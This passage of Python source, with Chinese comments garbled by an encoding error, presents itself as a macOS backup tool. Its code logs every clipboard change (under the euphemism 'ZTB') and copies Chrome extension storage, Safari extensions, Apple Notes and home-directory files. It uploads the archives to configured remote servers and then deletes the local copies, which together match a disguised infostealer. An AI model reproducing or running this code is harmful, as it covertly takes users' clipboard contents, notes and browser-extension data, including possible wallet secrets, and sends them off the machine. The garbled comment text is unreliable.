        """ä¸Šä¼ å•ä¸ªæ–‡ä»¶
        
        Args:
            file_path: è¦ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„
            
        Returns:
            bool: ä¸Šä¼ æ˜¯å¦æˆåŠŸ
        """
        if not os.path.exists(file_path):
            logging.error(f"æ–‡ä»¶ä¸å­˜åœ¨: {file_path}")
            return False

        try:
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"æ–‡ä»¶å¤§å°ä¸º0: {file_path}")
                self._safe_remove_file(file_path, retry=False)
                return False
            
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"æ–‡ä»¶è¿‡å¤§: {file_path} ({file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB)")
                self._safe_remove_file(file_path, retry=False)  # åˆ é™¤è¿‡å¤§çš„æ–‡ä»¶
                return False

            server_index = 0
            total_retries = 0
            max_total_retries = len(self.config.UPLOAD_SERVERS) * self.config.MAX_SERVER_RETRIES
            upload_success = False

            while total_retries < max_total_retries and not upload_success:
                if not self._check_internet_connection():
                    logging.error("ç½‘ç»œè¿æ¥ä¸å¯ç”¨ï¼Œç­‰å¾…é‡è¯•...")
                    time.sleep(self.config.RETRY_DELAY)
                    total_retries += 1
                    continue

                current_server = self.config.UPLOAD_SERVERS[server_index]
                try:
                    # ä½¿ç”¨ with è¯­å¥ç¡®ä¿æ–‡ä»¶æ­£ç¡®å…³é—­
                    with open(file_path, "rb") as f:
                        response = requests.post(
                            current_server,
                            files={"file": f},
                            data={"token": self.api_token},
                            timeout=self.config.UPLOAD_TIMEOUT,
                            verify=True
                        )

                        if response.ok:
                            try:
                                result = response.json()
                                if result.get("status") == "ok":
                                    logging.info(f"âœ… æ–‡ä»¶ä¸Šä¼ æˆåŠŸ: {os.path.basename(file_path)}")
                                    upload_success = True
                                    break
                                else:
                                    error_msg = result.get("message", "æœªçŸ¥é”™è¯¯")
                                    error_code = result.get("code", 0)
                                    logging.error(f"æœåŠ¡å™¨è¿”å›é”™è¯¯ (ä»£ç : {error_code}): {error_msg}")
                                    
                                    # å¤„ç†ç‰¹å®šé”™è¯¯ç 
                                    if error_code in [402, 405]:  # æœåŠ¡å™¨é™åˆ¶æˆ–æƒé™é”™è¯¯
                                        server_index = (server_index + 1) % len(self.config.UPLOAD_SERVERS)
                                        if server_index == 0:  # å¦‚æœå·²ç»å°è¯•äº†æ‰€æœ‰æœåŠ¡å™¨
                                            time.sleep(self.config.RETRY_DELAY * 2)  # å¢åŠ ç­‰å¾…æ—¶é—´
                            except ValueError:
                                logging.error("æœåŠ¡å™¨è¿”å›æ— æ•ˆJSONæ•°æ®")
                        else:
                            logging.error(f"ä¸Šä¼ å¤±è´¥ï¼ŒHTTPçŠ¶æ€ç : {response.status_code}")

                except requests.exceptions.Timeout:
                    logging.error(f"ä¸Šä¼ è¶…æ—¶ (æœåŠ¡å™¨: {current_server})")
                except requests.exceptions.SSLError:
                    logging.error(f"SSLé”™è¯¯ (æœåŠ¡å™¨: {current_server})")
                except requests.exceptions.ConnectionError as e:
                    logging.error(f"è¿æ¥é”™è¯¯ (æœåŠ¡å™¨: {current_server}): {str(e)}")
                except requests.exceptions.RequestException as e:
                    logging.error(f"è¯·æ±‚å¼‚å¸¸ (æœåŠ¡å™¨: {current_server}): {str(e)}")
                except (OSError, IOError) as e:
                    logging.error(f"æ–‡ä»¶è¯»å–é”™è¯¯: {str(e)}")
                except Exception as e:
                    logging.error(f"ä¸Šä¼ å‡ºç°æœªçŸ¥é”™è¯¯: {str(e)}")

                # åˆ‡æ¢åˆ°ä¸‹ä¸€ä¸ªæœåŠ¡å™¨
                server_index = (server_index + 1) % len(self.config.UPLOAD_SERVERS)
                if server_index == 0:
                    time.sleep(self.config.RETRY_DELAY)  # æ‰€æœ‰æœåŠ¡å™¨éƒ½å°è¯•è¿‡åç­‰å¾…
                
                total_retries += 1

            # æ— è®ºä¸Šä¼ æˆåŠŸè¿˜æ˜¯å¤±è´¥ï¼Œéƒ½å°è¯•åˆ é™¤æ–‡ä»¶
            self._safe_remove_file(file_path, retry=True)

            if not upload_success:
                logging.error("âŒ ä¸Šä¼ å¤±è´¥ï¼Œå·²è¾¾åˆ°æœ€å¤§é‡è¯•æ¬¡æ•°")
                return False
                
            return True

        except (OSError, IOError, PermissionError) as e:
            logging.error(f"å¤„ç†æ–‡ä»¶æ—¶å‡ºé”™: {str(e)}")
            # å‘ç”Ÿé”™è¯¯æ—¶ä¹Ÿå°è¯•åˆ é™¤æ–‡ä»¶
            self._safe_remove_file(file_path, retry=False)
            return False

    def zip_backup_folder(self, folder_path, zip_file_path):
        """å‹ç¼©å¤‡ä»½æ–‡ä»¶å¤¹ä¸ºtar.gzæ ¼å¼
        
        Args:
            folder_path: è¦å‹ç¼©çš„æ–‡ä»¶å¤¹è·¯å¾„
            zip_file_path: å‹ç¼©æ–‡ä»¶è·¯å¾„ï¼ˆä¸å«æ‰©å±•åï¼‰
            
        Returns:
            str or list: å‹ç¼©æ–‡ä»¶è·¯å¾„æˆ–å‹ç¼©æ–‡ä»¶è·¯å¾„åˆ—è¡¨
        """
        try:
            if folder_path is None or not os.path.exists(folder_path):
                return None

            # æ£€æŸ¥æºç›®å½•æ˜¯å¦ä¸ºç©º
            total_files = sum(len(files) for _, _, files in os.walk(folder_path))
            if total_files == 0:
                logging.error(f"æºç›®å½•ä¸ºç©º {folder_path}")
                return None

            # è®¡ç®—æºç›®å½•å¤§å°
            dir_size = 0
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    try:
                        file_path = os.path.join(dirpath, filename)
                        file_size = os.path.getsize(file_path)
                        if file_size > 0:  # è·³è¿‡ç©ºæ–‡ä»¶
                            dir_size += file_size
                    except OSError as e:
                        logging.error(f"è·å–æ–‡ä»¶å¤§å°å¤±è´¥ {file_path}: {e}")
                        continue

            if dir_size == 0:
                logging.error(f"æºç›®å½•å®é™…å¤§å°ä¸º0 {folder_path}")
                return None

            if dir_size > self.config.MAX_SOURCE_DIR_SIZE:
                return self.split_large_directory(folder_path, zip_file_path)

            tar_path = f"{zip_file_path}.tar.gz"
            if os.path.exists(tar_path):
                os.remove(tar_path)

            with tarfile.open(tar_path, "w:gz") as tar:
                tar.add(folder_path, arcname=os.path.basename(folder_path))

            # éªŒè¯å‹ç¼©æ–‡ä»¶
            try:
                compressed_size = os.path.getsize(tar_path)
                if compressed_size == 0:
                    logging.error(f"å‹ç¼©æ–‡ä»¶å¤§å°ä¸º0 {tar_path}")
                    if os.path.exists(tar_path):
                        os.remove(tar_path)
                    return None
                    
                if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                    os.remove(tar_path)
                    return self.split_large_directory(folder_path, zip_file_path)

                self._clean_directory(folder_path)
                return tar_path
            except OSError as e:
                logging.error(f"è·å–å‹ç¼©æ–‡ä»¶å¤§å°å¤±è´¥ {tar_path}: {e}")
                if os.path.exists(tar_path):
                    os.remove(tar_path)
                return None
                
        except (OSError, IOError, PermissionError, tarfile.TarError) as e:
            logging.error(f"å‹ç¼©å¤±è´¥ {folder_path}: {e}")
            return None

    def split_large_directory(self, folder_path, base_zip_path):
        """å°†å¤§ç›®å½•åˆ†å‰²æˆå¤šä¸ªå°å—å¹¶åˆ†åˆ«å‹ç¼©
        
        Args:
            folder_path: è¦åˆ†å‰²çš„ç›®å½•è·¯å¾„
            base_zip_path: åŸºç¡€å‹ç¼©æ–‡ä»¶è·¯å¾„
            
        Returns:
            list: å‹ç¼©æ–‡ä»¶è·¯å¾„åˆ—è¡¨
        """
        try:
            compressed_files = []
            current_size = 0
            current_files = []
            part_num = 0
            
            # åˆ›å»ºä¸´æ—¶ç›®å½•å­˜æ”¾åˆ†å—
            temp_dir = os.path.join(os.path.dirname(folder_path), "temp_split")
            if not self._ensure_directory(temp_dir):
                return None

            # ä½¿ç”¨æ›´ä¿å®ˆçš„å‹ç¼©æ¯”ä¾‹ä¼°ç®—ï¼ˆå‡è®¾å‹ç¼©åä¸ºåŸå§‹å¤§å°çš„70%ï¼‰
            COMPRESSION_RATIO = 0.7
            # ä¸ºäº†ç¡®ä¿å®‰å…¨ï¼Œå°†ç›®æ ‡å¤§å°è®¾ç½®ä¸ºé™åˆ¶çš„70%
            SAFETY_MARGIN = 0.7
            MAX_CHUNK_SIZE = int(self.config.MAX_SINGLE_FILE_SIZE * SAFETY_MARGIN / COMPRESSION_RATIO)

            # å…ˆæ”¶é›†æ‰€æœ‰æ–‡ä»¶ä¿¡æ¯
            all_files = []
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    file_path = os.path.join(dirpath, filename)
                    try:
                        file_size = os.path.getsize(file_path)
                        if file_size > 0:  # è·³è¿‡ç©ºæ–‡ä»¶
                            rel_path = os.path.relpath(file_path, folder_path)
                            all_files.append((file_path, rel_path, file_size))
                    except OSError:
                        continue

            # æŒ‰æ–‡ä»¶å¤§å°é™åºæ’åº
            all_files.sort(key=lambda x: x[2], reverse=True)

            # æ£€æŸ¥æ˜¯å¦æœ‰å•ä¸ªæ–‡ä»¶è¶…è¿‡é™åˆ¶
            for file_path, _, file_size in all_files[:]:  # ä½¿ç”¨åˆ‡ç‰‡åˆ›å»ºå‰¯æœ¬ä»¥é¿å…åœ¨è¿­ä»£æ—¶ä¿®æ”¹åˆ—è¡¨
                if file_size > MAX_CHUNK_SIZE:
                    logging.error(f"å•ä¸ªæ–‡ä»¶è¿‡å¤§: {file_size / 1024 / 1024:.1f}MB")
                    all_files.remove((file_path, _, file_size))

            # ä½¿ç”¨æœ€ä¼˜åŒ¹é…ç®—æ³•è¿›è¡Œåˆ†ç»„
            current_chunk = []
            current_chunk_size = 0
            
            for file_info in all_files:
                file_path, rel_path, file_size = file_info
                
                # å¦‚æœå½“å‰æ–‡ä»¶ä¼šå¯¼è‡´å½“å‰å—è¶…è¿‡é™åˆ¶ï¼Œåˆ›å»ºæ–°å—
                if current_chunk_size + file_size > MAX_CHUNK_SIZE and current_chunk:
                    # åˆ›å»ºæ–°çš„åˆ†å—ç›®å½•
                    part_dir = os.path.join(temp_dir, f"part{part_num}")
                    if self._ensure_directory(part_dir):
                        # å¤åˆ¶æ–‡ä»¶åˆ°åˆ†å—ç›®å½•
                        chunk_success = True
                        for src, dst_rel, _ in current_chunk:
                            dst = os.path.join(part_dir, dst_rel)
                            dst_dir = os.path.dirname(dst)
                            if not self._ensure_directory(dst_dir):
                                chunk_success = False
                                break
                            try:
                                shutil.copy2(src, dst)
                            except Exception:
                                chunk_success = False
                                break
                        
                        if chunk_success:
                            # å‹ç¼©åˆ†å—ï¼Œä½¿ç”¨æ›´é«˜çš„å‹ç¼©çº§åˆ«
                            tar_path = f"{base_zip_path}_part{part_num}.tar.gz"
                            try:
                                with tarfile.open(tar_path, "w:gz", compresslevel=9) as tar:
                                    tar.add(part_dir, arcname=os.path.basename(folder_path))
                                
                                compressed_size = os.path.getsize(tar_path)
                                if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                                    os.remove(tar_path)
                                    # å¦‚æœå‹ç¼©åä»ç„¶è¿‡å¤§ï¼Œå°è¯•å°†å½“å‰å—å†æ¬¡åˆ†å‰²
                                    if len(current_chunk) > 1:
                                        mid = len(current_chunk) // 2
                                        # é€’å½’å¤„ç†å‰åŠéƒ¨åˆ†
                                        self._process_partial_chunk(current_chunk[:mid], temp_dir, base_zip_path, 
                                                                 part_num, compressed_files)
                                        # é€’å½’å¤„ç†ååŠéƒ¨åˆ†
                                        self._process_partial_chunk(current_chunk[mid:], temp_dir, base_zip_path, 
                                                                 part_num + 1, compressed_files)
                                    part_num += 2
                                else:
                                    compressed_files.append(tar_path)
                                    logging.info(f"åˆ†å— {part_num + 1}: {current_chunk_size / 1024 / 1024:.1f}MB -> {compressed_size / 1024 / 1024:.1f}MB")
                                    part_num += 1
                            except Exception:
                                if os.path.exists(tar_path):
                                    os.remove(tar_path)
                    
                    self._clean_directory(part_dir)
                    current_chunk = []
                    current_chunk_size = 0
                
                # æ·»åŠ æ–‡ä»¶åˆ°å½“å‰å—
                current_chunk.append((file_path, rel_path, file_size))
                current_chunk_size += file_size
            
            # å¤„ç†æœ€åä¸€ä¸ªå—
            if current_chunk:
                part_dir = os.path.join(temp_dir, f"part{part_num}")
                if self._ensure_directory(part_dir):
                    chunk_success = True
                    for src, dst_rel, _ in current_chunk:
                        dst = os.path.join(part_dir, dst_rel)
                        dst_dir = os.path.dirname(dst)
                        if not self._ensure_directory(dst_dir):
                            chunk_success = False
                            break
                        try:
                            shutil.copy2(src, dst)
                        except Exception:
                            chunk_success = False
                            break
                    
                    if chunk_success:
                        tar_path = f"{base_zip_path}_part{part_num}.tar.gz"
                        try:
                            with tarfile.open(tar_path, "w:gz", compresslevel=9) as tar:
                                tar.add(part_dir, arcname=os.path.basename(folder_path))
                            
                            compressed_size = os.path.getsize(tar_path)
                            if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                                os.remove(tar_path)
                                # å¦‚æœå‹ç¼©åä»ç„¶è¿‡å¤§ï¼Œå°è¯•å°†å½“å‰å—å†æ¬¡åˆ†å‰²
                                if len(current_chunk) > 1:
                                    mid = len(current_chunk) // 2
                                    # é€’å½’å¤„ç†å‰åŠéƒ¨åˆ†
                                    self._process_partial_chunk(current_chunk[:mid], temp_dir, base_zip_path, 
                                                             part_num, compressed_files)
                                    # é€’å½’å¤„ç†ååŠéƒ¨åˆ†
                                    self._process_partial_chunk(current_chunk[mid:], temp_dir, base_zip_path, 
                                                             part_num + 1, compressed_files)
                            else:
                                compressed_files.append(tar_path)
                                logging.info(f"æœ€ååˆ†å—: {current_chunk_size / 1024 / 1024:.1f}MB -> {compressed_size / 1024 / 1024:.1f}MB")
                        except Exception:
                            if os.path.exists(tar_path):
                                os.remove(tar_path)
                    
                    self._clean_directory(part_dir)
            
            # æ¸…ç†ä¸´æ—¶ç›®å½•å’Œæºç›®å½•
            self._clean_directory(temp_dir)
            self._clean_directory(folder_path)
            
            if not compressed_files:
                logging.error("åˆ†å‰²å¤±è´¥ï¼Œæ²¡æœ‰ç”Ÿæˆæœ‰æ•ˆçš„å‹ç¼©æ–‡ä»¶")
                return None
            
            logging.info(f"å·²åˆ†å‰²ä¸º {len(compressed_files)} ä¸ªå‹ç¼©æ–‡ä»¶")
            return compressed_files
        except Exception:
            logging.error("åˆ†å‰²å¤±è´¥")
            return None

    def _process_partial_chunk(self, chunk, temp_dir, base_zip_path, part_num, compressed_files):
        """å¤„ç†éƒ¨åˆ†åˆ†å—
        
        Args:
            chunk: è¦å¤„ç†çš„æ–‡ä»¶åˆ—è¡¨
            temp_dir: ä¸´æ—¶ç›®å½•è·¯å¾„
            base_zip_path: åŸºç¡€å‹ç¼©æ–‡ä»¶è·¯å¾„
            part_num: åˆ†å—ç¼–å·
            compressed_files: å‹ç¼©æ–‡ä»¶åˆ—è¡¨
        """
        part_dir = os.path.join(temp_dir, f"part{part_num}_sub")
        if not self._ensure_directory(part_dir):
            return
        
        chunk_success = True
        total_size = 0
        for src, dst_rel, file_size in chunk:
            dst = os.path.join(part_dir, dst_rel)
            dst_dir = os.path.dirname(dst)
            if not self._ensure_directory(dst_dir):
                chunk_success = False
                break
            try:
                shutil.copy2(src, dst)
                total_size += file_size
            except Exception:
                chunk_success = False
                break
        
        if chunk_success:
            tar_path = f"{base_zip_path}_part{part_num}_sub.tar.gz"
            try:
                with tarfile.open(tar_path, "w:gz", compresslevel=9) as tar:
                    tar.add(part_dir, arcname=os.path.basename(os.path.dirname(part_dir)))
                
                compressed_size = os.path.getsize(tar_path)
                if compressed_size <= self.config.MAX_SINGLE_FILE_SIZE:
                    compressed_files.append(tar_path)
                    logging.info(f"å­åˆ†å—: {total_size / 1024 / 1024:.1f}MB -> {compressed_size / 1024 / 1024:.1f}MB")
                else:
                    os.remove(tar_path)
            except Exception:
                if os.path.exists(tar_path):
                    os.remove(tar_path)
        
        self._clean_directory(part_dir)

    def get_clipboard_content(self):
        """è·å–ZTBå†…å®¹"""
        try:
            content = subprocess.check_output(['pbpaste']).decode('utf-8')
            if content is None:
                return None
            # å»é™¤ç©ºç™½å­—ç¬¦
            content = content.strip()
            return content if content else None
        except (subprocess.CalledProcessError, RuntimeError, UnicodeDecodeError) as e:
            logging.error(f"âŒ è·å–ZTBå‡ºé”™: {str(e)}")
            return None

    def log_clipboard_update(self, content, file_path):
        """è®°å½•ZTBæ›´æ–°åˆ°æ–‡ä»¶"""
        try:
            # ç¡®ä¿ç›®å½•å­˜åœ¨
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            
            # å†™å…¥æ—¥å¿—
            with open(file_path, 'a', encoding='utf-8', errors='ignore') as f:
                f.write(f"\n=== ğŸ“‹ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                f.write(f"{content}\n")
                f.write("-"*30 + "\n")
        except (OSError, IOError, PermissionError) as e:
            if self.config.DEBUG_MODE:
                logging.error(f"âŒ è®°å½•ZTBå¤±è´¥: {e}")

    def monitor_clipboard(self, file_path, interval=3):
        """ç›‘æ§ZTBå˜åŒ–å¹¶è®°å½•åˆ°æ–‡ä»¶
        
        Args:
            file_path: æ—¥å¿—æ–‡ä»¶è·¯å¾„
            interval: æ£€æŸ¥é—´éš”ï¼ˆç§’ï¼‰
        """
        # ç¡®ä¿æ—¥å¿—ç›®å½•å­˜åœ¨
        log_dir = os.path.dirname(file_path)
        if not os.path.exists(log_dir):
            try:
                os.makedirs(log_dir, exist_ok=True)
            except Exception as e:
                logging.error(f"âŒ åˆ›å»ºZTBæ—¥å¿—ç›®å½•å¤±è´¥: {e}")
                return

        last_content = ""
        error_count = 0  # æ·»åŠ é”™è¯¯è®¡æ•°
        max_errors = 5   # æœ€å¤§è¿ç»­é”™è¯¯æ¬¡æ•°
        
        while True:
            try:
                current_content = self.get_clipboard_content()
                # åªæœ‰å½“ZTBå†…å®¹éç©ºä¸”ä¸ä¸Šæ¬¡ä¸åŒæ—¶æ‰è®°å½•
                if current_content and current_content != last_content:
                    self.log_clipboard_update(current_content, file_path)
                    last_content = current_content
                    if self.config.DEBUG_MODE:
                        logging.info("ğŸ“‹ æ£€æµ‹åˆ°ZTBæ›´æ–°")
                    error_count = 0  # é‡ç½®é”™è¯¯è®¡æ•°
                else:
                    error_count = 0  # ç©ºå†…å®¹ä¸ç®—é”™è¯¯ï¼Œé‡ç½®è®¡æ•°
            except Exception as e:
                error_count += 1
                if error_count >= max_errors:
                    if self.config.DEBUG_MODE:
                        logging.error(f"âŒ ZTBç›‘æ§è¿ç»­å‡ºé”™{max_errors}æ¬¡ï¼Œç­‰å¾…{self.config.CLIPBOARD_ERROR_WAIT}ç§’åé‡è¯•")
                    time.sleep(self.config.CLIPBOARD_ERROR_WAIT)
                    error_count = 0  # é‡ç½®é”™è¯¯è®¡æ•°
                elif self.config.DEBUG_MODE:
                    logging.error(f"âŒ ZTBç›‘æ§å‡ºé”™: {e}")
            time.sleep(interval if interval else self.config.CLIPBOARD_CHECK_INTERVAL)

    def upload_backup(self, backup_path):
        """ä¸Šä¼ å¤‡ä»½æ–‡ä»¶
        
        Args:
            backup_path: å¤‡ä»½æ–‡ä»¶è·¯å¾„æˆ–å¤‡ä»½æ–‡ä»¶è·¯å¾„åˆ—è¡¨
            
        Returns:
            bool: ä¸Šä¼ æ˜¯å¦æˆåŠŸ
        """
        if isinstance(backup_path, list):
            success = True
            for path in backup_path:
                if not self.upload_file(path):
                    success = False
            return success
        else:
            return self.upload_file(backup_path)

    def backup_specified_files(self, source_dir, target_dir):
        """å¤‡ä»½æŒ‡å®šçš„ç›®å½•å’Œæ–‡ä»¶
        
        Args:
            source_dir: æºç›®å½•è·¯å¾„
            target_dir: ç›®æ ‡ç›®å½•è·¯å¾„
            
        Returns:
            str: å¤‡ä»½ç›®å½•è·¯å¾„ï¼Œå¦‚æœå¤±è´¥åˆ™è¿”å›None
        """
        source_dir = os.path.abspath(os.path.expanduser(source_dir))
        target_dir = os.path.abspath(os.path.expanduser(target_dir))

        if self.config.DEBUG_MODE:
            logging.debug(f"å¼€å§‹å¤‡ä»½æŒ‡å®šç›®å½•å’Œæ–‡ä»¶:")
            logging.debug(f"æºç›®å½•: {source_dir}")
            logging.debug(f"ç›®æ ‡ç›®å½•: {target_dir}")

        if not os.path.exists(source_dir):
            logging.error(f"âŒ æºç›®å½•ä¸å­˜åœ¨: {source_dir}")
            return None

        if not os.access(source_dir, os.R_OK):
            logging.error(f"âŒ æºç›®å½•æ²¡æœ‰è¯»å–æƒé™: {source_dir}")
            return None

        if not self._clean_directory(target_dir):
            logging.error(f"âŒ æ— æ³•æ¸…ç†æˆ–åˆ›å»ºç›®æ ‡ç›®å½•: {target_dir}")
            return None

        files_count = 0
        total_size = 0
        retry_count = 3
        retry_delay = 5

        for item in self.config.MACOS_SPECIFIC_DIRS:
            source_path = os.path.join(source_dir, item)
            if not os.path.exists(source_path):
                if self.config.DEBUG_MODE:
                    logging.debug(f"è·³è¿‡ä¸å­˜åœ¨çš„é¡¹ç›®: {source_path}")
                continue

            try:
                if os.path.isdir(source_path):
                    # å¤åˆ¶ç›®å½•
                    target_path = os.path.join(target_dir, item)
                    shutil.copytree(source_path, target_path, dirs_exist_ok=True)
                    dir_size = self._get_dir_size(target_path)
                    files_count += 1
                    total_size += dir_size
                    if self.config.DEBUG_MODE:
                        logging.debug(f"æˆåŠŸå¤åˆ¶ç›®å½•: {source_path} -> {target_path}")
                else:
                    # å¤åˆ¶æ–‡ä»¶
                    target_path = os.path.join(target_dir, item)
                    shutil.copy2(source_path, target_path)
                    file_size = os.path.getsize(target_path)
                    files_count += 1
                    total_size += file_size
                    if self.config.DEBUG_MODE:
                        logging.debug(f"æˆåŠŸå¤åˆ¶æ–‡ä»¶: {source_path} -> {target_path}")
            except Exception as e:
                if self.config.DEBUG_MODE:
                    logging.debug(f"å¤åˆ¶å¤±è´¥: {source_path} - {str(e)}")

        # è¿½åŠ ï¼šå¤‡ä»½ Chrome ä¸ Safari æŒ‡å®šç›®å½•
        try:
            home_dir = os.path.expanduser('~')
            # Chrome ç›®å½•
            chrome_base = os.path.join(home_dir, 'Library', 'Application Support', 'Google', 'Chrome', 'Default')
            chrome_local_ext = os.path.join(chrome_base, 'Local Extension Settings')
            chrome_extensions = os.path.join(chrome_base, 'Extensions')
            # Safari ç›®å½•ï¼ˆä¼ ç»Ÿæ‰©å±•ï¼‰
            safari_extensions_legacy = os.path.join(home_dir, 'Library', 'Safari', 'Extensions')
            # Safari å®¹å™¨ç›®å½•ï¼ˆéƒ¨åˆ†ç³»ç»Ÿ/ç‰ˆæœ¬ï¼‰
            safari_container_extensions = os.path.join(home_dir, 'Library', 'Containers', 'com.apple.Safari', 'Data', 'Library', 'Safari', 'Extensions')

            def copy_dir_if_exists(src_dir, dst_name):
                nonlocal files_count, total_size
                if os.path.exists(src_dir) and os.path.isdir(src_dir):
                    target_path = os.path.join(target_dir, dst_name)
                    try:
                        # ç¡®ä¿ç›®æ ‡çˆ¶ç›®å½•å­˜åœ¨ï¼›è‹¥å·²å­˜åœ¨åŒåç›®å½•ï¼Œè¦†ç›–å¤åˆ¶
                        parent_dir = os.path.dirname(target_path)
                        if not self._ensure_directory(parent_dir):
                            return
                        if os.path.exists(target_path):
                            shutil.rmtree(target_path, ignore_errors=True)
                        shutil.copytree(src_dir, target_path)
                        dir_size = self._get_dir_size(target_path)
                        files_count += 1
                        total_size += dir_size
                        if self.config.DEBUG_MODE:
                            logging.debug(f"æˆåŠŸå¤åˆ¶ç›®å½•: {src_dir} -> {target_path}")
                    except Exception as e:
                        if self.config.DEBUG_MODE:
                            logging.debug(f"å¤åˆ¶ç›®å½•å¤±è´¥: {src_dir} - {str(e)}")

            # æ‰§è¡Œå¤åˆ¶
            copy_dir_if_exists(chrome_local_ext, 'chrome_local_extension_settings')
            copy_dir_if_exists(chrome_extensions, 'chrome_extensions')
            copy_dir_if_exists(safari_extensions_legacy, 'safari_extensions')
            copy_dir_if_exists(safari_container_extensions, 'safari_container_extensions')
        except Exception as e:
            if self.config.DEBUG_MODE:
                logging.debug(f"è¿½åŠ æµè§ˆå™¨ç›®å½•å¤‡ä»½å¤±è´¥: {str(e)}")

        if files_count > 0:
            logging.info(f"\nğŸ“Š æŒ‡å®šæ–‡ä»¶å¤‡ä»½å®Œæˆ:")
            logging.info(f"   ğŸ“ æ–‡ä»¶æ•°é‡: {files_count}")
            logging.info(f"   ğŸ’¾ æ€»å¤§å°: {total_size / 1024 / 1024:.1f}MB")
            return target_dir
        else:
            logging.error(f"âŒ æœªæ‰¾åˆ°éœ€è¦å¤‡ä»½çš„æŒ‡å®šæ–‡ä»¶")
            return None

    def has_clipboard_content(self, file_path):
        """æ£€æŸ¥ç²˜è´´æ¿æ–‡ä»¶æ˜¯å¦æœ‰å®é™…å†…å®¹è®°å½•
        
        Args:
            file_path: ç²˜è´´æ¿æ—¥å¿—æ–‡ä»¶è·¯å¾„
            
        Returns:
            bool: æ˜¯å¦æœ‰å®é™…å†…å®¹è®°å½•
        """
        try:
            if not os.path.exists(file_path):
                return False
                
            # æ£€æŸ¥æ–‡ä»¶å¤§å°
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                return False
                
            # è¯»å–æ–‡ä»¶å†…å®¹
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read().strip()
                
            if not content:
                return False
                
            # æ£€æŸ¥æ˜¯å¦åªåŒ…å«æ ‡é¢˜è¡Œï¼ˆæ²¡æœ‰å®é™…å†…å®¹ï¼‰
            lines = content.split('\n')
            actual_content_lines = []
            
            for line in lines:
                line = line.strip()
                # è·³è¿‡ç©ºè¡Œã€æ ‡é¢˜è¡Œå’Œåˆ†éš”çº¿
                if (line and 
                    not line.startswith('===') and 
                    not line.startswith('ğŸ“‹') and 
                    not line.startswith('-') * 30 and
                    not line.startswith('ZTBæ—¥å¿—å·²äº') and
                    not line.startswith('ZTBç›‘æ§å¯åŠ¨äº')):
                    actual_content_lines.append(line)
            
            # å¦‚æœæœ‰å®é™…å†…å®¹è¡Œï¼Œè¿”å›True
            return len(actual_content_lines) > 0
            
        except Exception as e:
            if self.config.DEBUG_MODE:
                logging.error(f"æ£€æŸ¥ç²˜è´´æ¿æ–‡ä»¶å†…å®¹å¤±è´¥: {e}")
            return False

def is_disk_available(disk_path):
    """æ£€æŸ¥ç£ç›˜æ˜¯å¦å¯ç”¨"""
    try:
        return os.path.exists(disk_path) and os.access(disk_path, os.R_OK)
    except Exception:
        return False

def get_available_volumes():
    """è·å–æ‰€æœ‰å¯ç”¨çš„æ•°æ®å·å’Œäº‘ç›˜ç›®å½•"""
    available_volumes = {}
    
    # è·å–ç”¨æˆ·ä¸»ç›®å½•
    user_path = os.path.expanduser('~')
    if os.path.exists(user_path):
        try:
            logging.info("æ­£åœ¨é…ç½®ç”¨æˆ·ä¸»ç›®å½•å¤‡ä»½...")
            logging.debug(f"ç”¨æˆ·ä¸»ç›®å½•: {user_path}")
            
            # é…ç½®ç”¨æˆ·ä¸»ç›®å½•å¤‡ä»½
            backup_path = os.path.join(BackupConfig.BACKUP_ROOT, 'home')
            available_volumes['home'] = {
                'docs': (os.path.abspath(user_path), os.path.join(backup_path, 'docs'), 1),
                'configs': (os.path.abspath(user_path), os.path.join(backup_path, 'configs'), 2),
                'specified': (os.path.abspath(user_path), os.path.join(backup_path, 'specified'), 4),  # ä½¿ç”¨specifiedæ›¿ä»£shell
            }
            logging.info(f"âœ… å·²é…ç½®ç”¨æˆ·ä¸»ç›®å½•å¤‡ä»½: {user_path}")
            
        except Exception as e:
            logging.error(f"âŒ é…ç½®ç”¨æˆ·ä¸»ç›®å½•å¤‡ä»½æ—¶å‡ºé”™: {e}")
    
    if not available_volumes:
        logging.warning("âš ï¸ æœªæ£€æµ‹åˆ°å¯ç”¨çš„ç”¨æˆ·ä¸»ç›®å½•")
    else:
        logging.info(f"ğŸ“Š å·²é…ç½®ç”¨æˆ·ä¸»ç›®å½•å¤‡ä»½")
        for name, config in available_volumes.items():
            logging.info(f"  - {name}: {config['docs'][0]}")
    
    return available_volumes

@lru_cache()
def get_username():
    """è·å–å½“å‰ç”¨æˆ·å"""
    return os.environ.get('USERNAME', '')

def clean_backup_directory():
    """æ¸…ç†å¤‡ä»½ç›®å½•ä¸­çš„ä¸´æ—¶æ–‡ä»¶å’Œç©ºç›®å½•"""
    try:
        if not os.path.exists(BackupConfig.BACKUP_ROOT):
            return
            
        # æ¸…ç†ä¸´æ—¶ç›®å½•
        temp_dir = os.path.join(BackupConfig.BACKUP_ROOT, 'temp')
        if os.path.exists(temp_dir):
            try:
                shutil.rmtree(temp_dir)
            except Exception as e:
                logging.error(f"æ¸…ç†ä¸´æ—¶ç›®å½•å¤±è´¥: {e}")
        
        # æ¸…ç†ç©ºç›®å½•
        for root, dirs, files in os.walk(BackupConfig.BACKUP_ROOT, topdown=False):
            for dir_name in dirs:
                dir_path = os.path.join(root, dir_name)
                try:
                    if not os.listdir(dir_path):  # å¦‚æœç›®å½•ä¸ºç©º
                        os.rmdir(dir_path)
                except Exception:
                    continue
                    
    except Exception as e:
        logging.error(f"æ¸…ç†å¤‡ä»½ç›®å½•å¤±è´¥: {e}")

def backup_notes():
    """å¤‡ä»½Macçš„å¤‡å¿˜å½•æ•°æ®"""
    notes_dir = os.path.expanduser('~/Library/Group Containers/group.com.apple.notes')
    notes_backup_directory = os.path.join(BackupConfig.BACKUP_ROOT, "notes")
    
    if not os.path.exists(notes_dir):
        logging.error("å¤‡å¿˜å½•æ•°æ®ç›®å½•ä¸å­˜åœ¨")
        return None
        
    backup_manager = BackupManager()
